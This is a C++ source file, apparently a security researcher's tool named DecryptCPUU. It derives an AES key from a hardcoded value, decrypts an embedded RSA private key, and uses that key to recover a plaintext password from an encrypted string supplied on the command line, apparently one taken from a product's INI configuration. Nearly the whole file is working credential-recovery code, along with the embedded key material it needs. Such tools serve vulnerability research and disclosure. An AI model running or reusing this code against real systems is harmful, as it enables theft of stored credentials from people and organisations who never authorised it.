// DecryptCPUU.cpp
// Written by Rob Fuller @mubix in collaboration with @egypt
//

#include <iostream>
#include <windows.h>
#include <vector>
#include <stdexcept>
#include <cstdio>

// stolen from https://stackoverflow.com/a/27173017
static void print_buf(const char* title, const unsigned char* buf, size_t buf_len)
{
    size_t i = 0;
    fprintf(stdout, "%s\n", title);
    for (i = 0; i < buf_len; ++i)
        fprintf(stdout, "%02X%s", buf[i],
            (i + 1) % 16 == 0 ? "\r\n" : " ");

}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <encrypted_string>\n";
        return EXIT_FAILURE;
    }

    try {
        std::cout << "Crypto Is Horrible...\n";
        bool final;
        HCRYPTPROV phProv = 0;
        LPCSTR szContainer = NULL;
        const char* szProvider = "Microsoft Enhanced RSA and AES Cryptographic Provider";
        DWORD dwProvType = PROV_RSA_AES;
        DWORD dwFlags = CRYPT_VERIFYCONTEXT;

        final = CryptAcquireContextA(&phProv, szContainer, szProvider, dwProvType, dwFlags);
        printf("Did CryptAcquireContext work? %d\n", final);

        dwFlags = 0;
        HCRYPTKEY hKey = 0;
        ALG_ID Algid = CALG_SHA_512;
        HCRYPTHASH phHash;

        final = CryptCreateHash(phProv, Algid, hKey, dwFlags, &phHash);
        printf("Did CryptCreateHash work? %d\n", final);

        // 13dbb0c8aa05101a9bb000aa002fc45a - This is also the registry key for Outlook to encrypt data between client and server
        // https://microsoft.public.windows.group-policy.narkive.com/zZ9lzYY6/outlook-gpo
        byte pbData[16] = { 0x13, 0xdb, 0xb0, 0xc8, 0xaa, 0x05, 0x10, 0x1a, 0x9b, 0xb0, 0x00, 0xaa, 0x00, 0x2f, 0xc4, 0x5a };

        final = CryptHashData(phHash, pbData, 16, dwFlags);
        printf("Did CryptHashData work? %d\n", final);

        HCRYPTHASH hBaseData = phHash;
        HCRYPTKEY phKey;
        Algid = CALG_AES_256;

        final = CryptDeriveKey(phProv, Algid, hBaseData, dwFlags, &phKey);
        printf("Did CryptDeriveKey work? %d\n", final);

        // Encrypted Private Key
        byte pbEncKey[1184] = { 
            0x44, 0x6f, 0xf6, 0x26, 0xaf, 0x9d, 0xe6, 0x98, 0xe1, 0x28,
            0x6d, 0x32, 0xc7, 0x36, 0xcd, 0xa7, 0x31, 0xc5, 0x25, 0x1a,
            0xd3, 0xc4, 0xde, 0x70, 0x35, 0xb3, 0xd8, 0xd6, 0x2a, 0xf1,
            0xe6, 0x26, 0x71, 0x2b, 0x6c, 0xbd, 0xcb, 0x08, 0xd3, 0x0c,
            0x87, 0x27, 0x54, 0x4d, 0x06, 0x25, 0xb3, 0x35, 0xd3, 0x44,
            0xb6, 0x00, 0x54, 0x6e, 0xd4, 0x93, 0xb6, 0x83, 0xdb, 0x25,
            0xea, 0x21, 0xae, 0xa6, 0x30, 0x86, 0x3d, 0x97, 0x3a, 0xff,
            0x6c, 0x1f, 0x31, 0x17, 0x5a, 0x11, 0x44, 0x39, 0x98, 0x7e,
            0x62, 0x31, 0x10, 0x0a, 0x25, 0x47, 0x46, 0x9d, 0x01, 0x85,
            0x21, 0x05, 0xde, 0x27, 0x12, 0xe0, 0xae, 0x00, 0xa6, 0x24,
            0x06, 0x50, 0x6b, 0x4b, 0x72, 0x7e, 0x7d, 0x52, 0x2a, 0x3c,
            0xbe, 0x3c, 0x4c, 0x7f, 0xe9, 0x0f, 0x39, 0x8e, 0x4f, 0xe3,
            0x2c, 0x91, 0x72, 0x3d, 0xb3, 0x93, 0xd0, 0x6e, 0x4a, 0x99,
            0x61, 0xdb, 0xf4, 0x8f, 0x53, 0xf1, 0xa6, 0x37, 0xd8, 0x75,
            0x93, 0xb6, 0xba, 0x57, 0xe2, 0x0e, 0x8d, 0x84, 0xf0, 0xd3,
            0x5b, 0x00, 0x73, 0x35, 0xc0, 0xae, 0x24, 0x90, 0x68, 0x5b,
            0xb8, 0x90, 0x4a, 0x2e, 0x9f, 0xab, 0x56, 0x45, 0xd3, 0xd1,
            0x31, 0x62, 0xfb, 0x78, 0x09, 0xad, 0x02, 0x24, 0x83, 0xa3,
            0x1e, 0x81, 0xf1, 0xda, 0xe2, 0xe6, 0x21, 0x36, 0xdf, 0x51,
            0xbc, 0x73, 0x51, 0x38, 0x07, 0x58, 0xfa, 0xe5, 0x45, 0x00,
            0x71, 0x8f, 0x77, 0xaf, 0xd6, 0x59, 0x22, 0x65, 0x42, 0xe1,
            0xc6, 0x6a, 0x2f, 0xb7, 0x5e, 0x13, 0x1f, 0x1c, 0x44, 0x8d,
            0xef, 0xb9, 0x6c, 0x64, 0x2d, 0x57, 0x1b, 0x23, 0xa1, 0x71,
            0xf5, 0xeb, 0x95, 0xbc, 0xca, 0xa3, 0xfc, 0xc5, 0x10, 0x10,
            0x02, 0x7e, 0x1c, 0xcc, 0x60, 0xab, 0xde, 0xc3, 0x5f, 0xfa,
            0xd4, 0x8a, 0x9a, 0xb2, 0x67, 0x3a, 0x96, 0xed, 0x58, 0x4d,
            0x6b, 0xd6, 0xa2, 0xe8, 0xa5, 0xa2, 0xa4, 0x91, 0x25, 0xe0,
            0xda, 0x31, 0xc1, 0x6c, 0x4b, 0xee, 0x69, 0xc9, 0x09, 0x82,
            0xb7, 0x08, 0x76, 0xa6, 0xa6, 0xd2, 0x8d, 0x77, 0xe3, 0x38,
            0xf9, 0x9f, 0x49, 0x63, 0xf1, 0x95, 0xf9, 0x5b, 0x07, 0xd6,
            0xf0, 0x81, 0xca, 0xb7, 0x42, 0xa7, 0x27, 0x06, 0x39, 0x0f,
            0x41, 0x7a, 0x4b, 0x31, 0x3e, 0x9e, 0xfb, 0xcf, 0x57, 0x7e,
            0xaa, 0x94, 0x15, 0x91, 0xc9, 0x51, 0x16, 0x55, 0xf3, 0xd9,
            0xcc, 0x05, 0xc2, 0xa8, 0xf3, 0x29, 0x67, 0xf9, 0x87, 0xa4,
            0x61, 0xef, 0x78, 0x53, 0xa1, 0xe8, 0x02, 0xdd, 0xa0, 0x30,
            0x36, 0x61, 0xd6, 0x54, 0x73, 0x9c, 0x03, 0xc6, 0xe3, 0x01,
            0x93, 0x3f, 0xfe, 0x8c, 0x91, 0xef, 0x49, 0xab, 0x48, 0x39,
            0x3a, 0xfc, 0x56, 0xc7, 0x66, 0x77, 0x60, 0x2d, 0x0c, 0x88,
            0x67, 0x67, 0x8d, 0xf5, 0x40, 0x53, 0xe4, 0xe3, 0xe2, 0x34,
            0xf8, 0x27, 0x8f, 0x85, 0x69, 0x7a, 0xf7, 0x00, 0xe0, 0xdb,
            0x63, 0xb7, 0xbb, 0x08, 0xa0, 0x07, 0xa8, 0xec, 0xc6, 0x8c,
            0xe3, 0x70, 0x60, 0x88, 0x60, 0xb8, 0xcd, 0x78, 0x37, 0xd9,
            0xa2, 0xf6, 0xac, 0xb7, 0x58, 0xae, 0x4e, 0x96, 0x73, 0x73,
            0xf3, 0x1d, 0x88, 0x56, 0xcf, 0x0e, 0x18, 0x58, 0xa6, 0xe8,
            0xd2, 0x98, 0xa3, 0xc7, 0xcd, 0x7b, 0x77, 0x31, 0x19, 0x1f,
            0x89, 0x16, 0xbf, 0x2e, 0x3b, 0x4c, 0x87, 0xc2, 0x12, 0xb9,
            0xab, 0xc9, 0xe0, 0x11, 0xa2, 0x17, 0x7e, 0xd4, 0xbf, 0xee,
            0xa7, 0x7f, 0x9b, 0xe5, 0x0f, 0xb6, 0x66, 0x8d, 0x99, 0xfc,
            0xce, 0xb5, 0x8c, 0xc8, 0x13, 0x69, 0x9a, 0x09, 0x37, 0x60,
            0x82, 0xf6, 0x61, 0xa3, 0x91, 0x61, 0xfc, 0xd0, 0x9a, 0xe3,
            0xa5, 0x12, 0x90, 0xdc, 0x95, 0xfb, 0x2f, 0x43, 0xb0, 0xda,
            0x52, 0x5f, 0x79, 0x6c, 0x62, 0xd7, 0x61, 0x11, 0xf3, 0x5c,
            0xf3, 0xe5, 0xfc, 0x76, 0xdf, 0xe9, 0x5c, 0x54, 0x32, 0x17,
            0xf7, 0xe3, 0x78, 0x55, 0x1f, 0x5b, 0x93, 0x1e, 0x91, 0x4e,
            0xd8, 0xad, 0x17, 0x01, 0x12, 0x9b, 0x67, 0x56, 0x2e, 0xef,
            0xc1, 0xb4, 0x4f, 0x62, 0xc6, 0xd9, 0x7c, 0xdd, 0xcc, 0x3e,
            0x89, 0x10, 0xea, 0x28, 0xe8, 0x5c, 0x75, 0xa4, 0xca, 0x68,
            0x9d, 0x56, 0xc5, 0x66, 0x39, 0x34, 0xfd, 0xf9, 0x1c, 0x1f,
            0x74, 0x67, 0x5c, 0x19, 0x41, 0xf3, 0x5c, 0xec, 0x98, 0x3f,
            0x0f, 0x57, 0x22, 0x7a, 0x79, 0xeb, 0xe9, 0x79, 0xc2, 0x8b,
            0x3d, 0x43, 0x2d, 0x39, 0x5e, 0x5b, 0x4c, 0x8e, 0x52, 0xc0,
            0xb6, 0x6c, 0xd1, 0x70, 0xaa, 0x6e, 0x7a, 0x0c, 0x55, 0xb3,
            0x16, 0x50, 0x8b, 0x92, 0xfa, 0x8d, 0x18, 0xc2, 0xbb, 0xc1,
            0x09, 0xff, 0x5c, 0x0a, 0xd8, 0xc1, 0xb1, 0x32, 0x1a, 0xbf,
            0xd4, 0x4a, 0x72, 0x34, 0x0a, 0x55, 0xb1, 0xe6, 0x8f, 0xec,
            0x7b, 0x13, 0x52, 0x8f, 0xb1, 0x47, 0xa4, 0x26, 0xb2, 0xc9,
            0x57, 0xb4, 0xc2, 0x41, 0x5b, 0x96, 0xcb, 0x2f, 0x97, 0x8a,
            0xfc, 0x6f, 0x5a, 0xd8, 0x8c, 0x67, 0xd2, 0x04, 0x3d, 0x0a,
            0xbd, 0x9e, 0xf4, 0x03, 0x91, 0xe7, 0x65, 0x03, 0xcb, 0x92,
            0xc2, 0xbf, 0xf3, 0x2b, 0x5a, 0x5f, 0x30, 0x8f, 0x1a, 0x33,
            0xb6, 0x87, 0x2d, 0x21, 0x5e, 0x0f, 0xcd, 0x28, 0xc7, 0xd6,
            0x56, 0xdd, 0x4d, 0x85, 0x7f, 0xbc, 0x15, 0x76, 0xaa, 0xcb,
            0x7a, 0x79, 0xc3, 0xf0, 0x12, 0xab, 0xa3, 0xfd, 0x60, 0x1b,
            0x86, 0x59, 0x85, 0xd8, 0xb4, 0xdb, 0xd7, 0x44, 0xe4, 0xce,
            0x0f, 0x3e, 0x61, 0xec, 0xf4, 0x85, 0x6c, 0xcf, 0x14, 0xb5,
            0xcf, 0x63, 0x47, 0x5d, 0x39, 0xdf, 0xaf, 0xfe, 0x79, 0x5e,
            0x74, 0x2c, 0xee, 0x6e, 0x24, 0xf1, 0x35, 0xdd, 0x6c, 0x2f,
            0x29, 0xf5, 0x1e, 0x6b, 0xa7, 0x7e, 0x2b, 0x17, 0x77, 0xd8,
            0x81, 0x11, 0x1b, 0x91, 0x99, 0xac, 0x53, 0x11, 0x98, 0x89,
            0x7a, 0x15, 0x2f, 0xc9, 0x53, 0x02, 0x6c, 0xa9, 0x0f, 0x18,
            0x1e, 0xe4, 0xe3, 0xab, 0x63, 0x34, 0x76, 0xf0, 0x7f, 0xe9,
            0x4e, 0x98, 0xb3, 0x74, 0xdd, 0xe7, 0xc1, 0x8c, 0xac, 0x09,
            0xb2, 0x21, 0x30, 0x81, 0xdf, 0x09, 0xe5, 0x84, 0x75, 0xdf,
            0xd4, 0x59, 0x13, 0x8b, 0xdc, 0x72, 0xb8, 0xd5, 0x53, 0x23,
            0xa0, 0xb3, 0x2a, 0xe5, 0xdf, 0x9a, 0x81, 0xe5, 0xf0, 0x1c,
            0x5d, 0xf2, 0xab, 0x1d, 0x9c, 0x39, 0x02, 0x16, 0xd1, 0xb5,
            0x41, 0x52, 0x4c, 0xa0, 0xde, 0xdc, 0xec, 0x6b, 0x6b, 0xf7,
            0x46, 0x91, 0xe7, 0x8a, 0x8e, 0x6d, 0x92, 0xc6, 0x02, 0x79,
            0xef, 0xe7, 0x38, 0xa3, 0x20, 0x6e, 0xa3, 0xa2, 0x37, 0xda,
            0xac, 0x9b, 0x5a, 0xb2, 0x10, 0x45, 0xd5, 0x53, 0xbb, 0xcc,
            0x16, 0x53, 0x6f, 0xf0, 0xa4, 0x04, 0xa9, 0xaa, 0x4d, 0x4a,
            0xc6, 0xfa, 0x19, 0xf9, 0xdb, 0xbf, 0x8b, 0xb3, 0x48, 0x3f,
            0xa1, 0x1b, 0xf6, 0x5c, 0xe9, 0x92, 0x78, 0x5a, 0xb5, 0x7f,
            0x64, 0x4d, 0xec, 0x9f, 0x5a, 0x08, 0x5f, 0xf2, 0x20, 0x68,
            0xe2, 0x62, 0x5e, 0xeb, 0x7c, 0xb7, 0x58, 0xbf, 0x8b, 0xb9,
            0x57, 0x00, 0x0b, 0xd3, 0x03, 0x74, 0x5c, 0x11, 0xbf, 0x23,
            0xa9, 0xee, 0x30, 0x60, 0xef, 0x25, 0x84, 0xbb, 0xd4, 0x72,
            0xa2, 0xa2, 0xb7, 0x19, 0xbf, 0x4d, 0x4b, 0xfe, 0x87, 0xba,
            0x71, 0x5c, 0x1b, 0x85, 0x77, 0x08, 0x62, 0x9e, 0xd6, 0x3a,
            0x3a, 0x66, 0x88, 0x88, 0x28, 0x40, 0x58, 0x84, 0xb3, 0xab,
            0x53, 0xaf, 0x96, 0x6f, 0xbb, 0xc0, 0xab, 0x83, 0x9b, 0xbf,
            0x98, 0x79, 0x66, 0x81, 0xae, 0x8c, 0xe0, 0xbc, 0xc8, 0x7c,
            0x2a, 0xb2, 0xba, 0xd4, 0x91, 0xf9, 0xe2, 0x30, 0x0b, 0xba,
            0x48, 0x27, 0x99, 0x24, 0x5d, 0x0e, 0xc2, 0x9d, 0xd7, 0x5d,
            0x4f, 0xd7, 0x55, 0x69, 0x0e, 0xa5, 0x17, 0xe9, 0x13, 0x88,
            0x2b, 0xed, 0xf2, 0xc2, 0x4b, 0x6e, 0xca, 0x5c, 0xd8, 0xa3,
            0x52, 0x99, 0x3f, 0xd9, 0x46, 0x75, 0x7a, 0x75, 0x60, 0x33,
            0xa3, 0xbd, 0x4b, 0x9b, 0x37, 0xfc, 0x2f, 0x05, 0x0d, 0x62,
            0x17, 0x62, 0x55, 0x92, 0x05, 0x8c, 0xfe, 0xc0, 0xaf, 0x90,
            0x4b, 0x7f, 0x23, 0xdc, 0x35, 0x64, 0x4e, 0xbb, 0xce, 0xc1,
            0x1b, 0x41, 0xc9, 0x11, 0x93, 0x46, 0x3a, 0x2a, 0x42, 0xad,
            0xc4, 0xe8, 0x87, 0xf7, 0x3b, 0x6c, 0xef, 0x90, 0x5d, 0x39,
            0x9e, 0x4f, 0x30, 0x7a, 0xe3, 0xc4, 0x6e, 0x3a, 0x81, 0x3f,
            0xf9, 0xc4, 0x0f, 0x0d, 0xe1, 0x3c, 0x81, 0x01, 0x07, 0x57,
            0x8e, 0xe8, 0xa5, 0xea, 0xd4, 0x2c, 0xaa, 0xac, 0xe2, 0x6f,
            0x72, 0xf4, 0xb5, 0x18, 0x0b, 0xfa, 0xcf, 0xdd, 0xfe, 0x48,
            0xfa, 0x03, 0x94, 0xd2, 0x05, 0xf3, 0x93, 0xd4, 0x9a, 0x4f,
            0x3a, 0xd5, 0x56, 0x1f, 0xeb, 0xd0, 0xc0, 0x41, 0xce, 0xd4,
            0xc7, 0x05, 0x85, 0xda
        };

        dwFlags = 0;
        DWORD dwDataLen = sizeof(pbEncKey);
        final = CryptDecrypt(phKey, 0, TRUE, dwFlags, pbEncKey, &dwDataLen);
        //printf("GetLastError Code: %d\n", GetLastError());

        printf("Did it decrypt? %d\n", final);

        
     
        print_buf("RSA2 Private Key", pbEncKey, dwDataLen);
        std::cout << std::endl;

        CryptDestroyKey(phKey);
        CryptDestroyHash(phHash);

        dwFlags = 0;
        CryptReleaseContext(phProv, dwFlags);

        dwProvType = PROV_RSA_AES;
        dwFlags = CRYPT_VERIFYCONTEXT;

        final = CryptAcquireContextA(&phProv, szContainer, szProvider, dwProvType, dwFlags);
        printf("Did CryptAcquireContext work? %d\n", final);

        HCRYPTKEY hPubKey = 0;
        dwFlags = 0;
        phKey = 0;
        final = CryptImportKey(phProv, pbEncKey, dwDataLen, hPubKey, dwFlags, &phKey);
        printf("Did CryptImportKey work? %d\n", final);

        // Parse input
        const DWORD INPUT_MIN_LENGTH = 540; // 2 + 268 + 270
        const DWORD PUBKEY_SIZE = 268;

        DWORD inputLen = strlen(argv[1]);
        if (inputLen < INPUT_MIN_LENGTH || inputLen % 2 != 0) {
            throw std::runtime_error("Invalid input length");
        }

        std::vector<byte> iniPubkey(PUBKEY_SIZE);
        size_t iniEncPassLen = (inputLen / 2) - 2 - PUBKEY_SIZE;
        std::vector<byte> iniEncpasswd(iniEncPassLen);

        for (size_t input_idx = 2, pubkey_idx = 0; pubkey_idx < iniPubkey.size(); input_idx++, pubkey_idx++)
        {
            char v;
            if (sscanf_s(argv[1] + (input_idx * 2), "%2hhx", &v) != 1)
            {
                break;
            }
            iniPubkey[pubkey_idx] = v;

        }

        print_buf("INI Pubkey", iniPubkey.data(), iniPubkey.size());


        for (size_t input_idx = 270, pubkey_idx = 0; pubkey_idx < iniEncpasswd.size(); input_idx++, pubkey_idx++)
        {
            char v;
            if (sscanf_s(argv[1] + (input_idx * 2), "%2hhx", &v) != 1)
            {
                break;
            }
            iniEncpasswd[pubkey_idx] = v;

        }

        print_buf("\nEncrypted Password:", iniEncpasswd.data(), iniEncpasswd.size());
        HCRYPTKEY phDoubleKey;
        final = CryptImportKey(phProv, iniPubkey.data(), iniPubkey.size(), phKey, 0, &phDoubleKey);
        printf("GetLastError Code: %lu\n", GetLastError());
        printf("Did CryptImportKey on the Pub Key work? %d\n", final);

        final = CryptDecrypt(phDoubleKey, 0, TRUE, 0, iniEncpasswd.data(), (DWORD *)&iniEncPassLen);
        // Convert UTF-16LE to UTF-8
        int utf8Length = WideCharToMultiByte(CP_UTF8, 0, reinterpret_cast<LPCWCH>(iniEncpasswd.data()), -1, NULL, 0, NULL, NULL) / 2;
        std::vector<char> utf8String(utf8Length);
        WideCharToMultiByte(CP_UTF8, 0, reinterpret_cast<LPCWCH>(iniEncpasswd.data()), -1, utf8String.data(), utf8Length, NULL, NULL);

        // Print the decrypted password
        printf("Decrypted password: %s\n", utf8String.data());

        // Print each UTF-16LE character (for debugging)
        printf("Decrypted data (UTF-16LE chars): ");
        for (size_t i = 0; i < iniEncPassLen / 2; ++i) {
            wchar_t ch = reinterpret_cast<wchar_t*>(iniEncpasswd.data())[i];
            printf("%lc", ch);
        }
        printf("\n");

        // Print hexadecimal representation
        printf("Decrypted data (hex): ");
        for (size_t i = 0; i < iniEncPassLen; ++i) {
            printf("%02X ", iniEncpasswd[i]);
        }
        printf("\n");

    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

